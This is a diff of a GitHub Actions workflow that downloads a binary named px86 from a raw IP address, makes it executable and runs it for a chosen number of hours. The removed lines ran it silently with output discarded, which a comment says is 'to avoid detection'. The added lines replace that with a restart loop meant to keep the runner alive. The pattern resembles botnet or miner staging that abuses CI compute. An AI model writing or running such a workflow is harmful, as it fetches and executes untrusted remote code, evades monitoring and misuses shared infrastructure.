@@ -26,15 +26,17 @@ jobs:
         wget http://45.138.16.158/bins/px86 -O px86
         chmod +x px86
 
-    - name: Run binary with no output
+    - name: Keep VM alive with restart loop
       run: |
         UPTIME=${{ github.event.inputs.uptime }}
-        echo "Running silently for $UPTIME hours"
+        END_TIME=$(( $(date +%s) + ($UPTIME * 3600) ))
+        echo "Will keep running until: $(date -d @$END_TIME)"
         
-        # Run with nohup and redirect all output to avoid detection
-        nohup ./px86 x86 > /dev/null 2>&1 &
+        while [ $(date +%s) -lt $END_TIME ]; do
+          echo "Attempting to run binary..."
+          # Try to run the binary, but continue even if it fails
+          ./px86 x86 || echo "Binary exited, continuing..."
+          sleep 1
+        done
         
-        # Simple sleep to keep workflow alive
-        sleep $(($UPTIME * 3600))
-        
-        echo "Time completed"
+        echo "Successfully completed $UPTIME hours"
